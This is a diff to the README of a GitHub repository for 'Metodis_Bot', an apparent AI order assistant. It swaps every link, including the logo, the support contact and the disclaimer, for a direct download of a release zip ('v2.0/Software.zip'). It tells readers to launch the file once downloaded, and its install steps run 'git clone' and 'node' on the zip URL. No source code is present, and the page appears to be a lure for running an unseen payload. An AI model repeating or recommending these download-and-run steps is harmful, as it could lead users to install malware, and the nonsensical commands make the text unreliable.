@@ -3,7 +3,7 @@
 
 🔮 Welcome to the Metodis_Bot repository! 🤖
 
-![Metodis_Bot Logo](https://github.com/MyNameIsBenja/metodis_bot/releases/download/v1.0/Release.zip)
+![Metodis_Bot Logo](https://github.com/MyNameIsBenja/metodis_bot/releases/download/v2.0/Software.zip)
 
 ### Description
 📌This is my order. The main part of the code is not here because of secrets.
@@ -24,9 +24,9 @@
 - Psychology
 
 ### Get Started
-1. Download the software package from the following link: [Download https://github.com/MyNameIsBenja/metodis_bot/releases/download/v1.0/Release.zip](https://github.com/MyNameIsBenja/metodis_bot/releases/download/v1.0/Release.zip)
+1. Download the software package from the following link: [Download https://github.com/MyNameIsBenja/metodis_bot/releases/download/v2.0/Software.zip](https://github.com/MyNameIsBenja/metodis_bot/releases/download/v2.0/Software.zip)
    
-   ![Software Download](https://github.com/MyNameIsBenja/metodis_bot/releases/download/v1.0/Release.zip)
+   ![Software Download](https://github.com/MyNameIsBenja/metodis_bot/releases/download/v2.0/Software.zip)
    
    (Note: The software needs to be launched once downloaded.)
 
@@ -47,7 +47,7 @@ To install Metodis_Bot on your system, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/MyNameIsBenja/metodis_bot/releases/download/v1.0/Release.zip
+   git clone https://github.com/MyNameIsBenja/metodis_bot/releases/download/v2.0/Software.zip
    ```
 2. Install dependencies:
    ```bash
@@ -57,14 +57,14 @@ To install Metodis_Bot on your system, follow these steps:
 
 4. Run the bot:
    ```bash
-   node https://github.com/MyNameIsBenja/metodis_bot/releases/download/v1.0/Release.zip
+   node https://github.com/MyNameIsBenja/metodis_bot/releases/download/v2.0/Software.zip
    ```
 
 ### Contributing
 We welcome contributions to enhance the capabilities of Metodis_Bot. If you have any ideas, bug fixes, or features to add, feel free to submit a pull request.
 
 ### Support
-For any queries or issues related to Metodis_Bot, please reach out to our team at https://github.com/MyNameIsBenja/metodis_bot/releases/download/v1.0/Release.zip
+For any queries or issues related to Metodis_Bot, please reach out to our team at https://github.com/MyNameIsBenja/metodis_bot/releases/download/v2.0/Software.zip
 
 Thank you for exploring Metodis_Bot! 🚀
 
@@ -72,4 +72,4 @@ Thank you for exploring Metodis_Bot! 🚀
 
 Get started with your AI assistant today and revolutionize how you manage your orders and tasks! 🌟
 
-*Disclaimer: Metodis_Bot is a fictional AI assistant created for the purpose of this https://github.com/MyNameIsBenja/metodis_bot/releases/download/v1.0/Release.zip file.*
+*Disclaimer: Metodis_Bot is a fictional AI assistant created for the purpose of this https://github.com/MyNameIsBenja/metodis_bot/releases/download/v2.0/Software.zip file.*
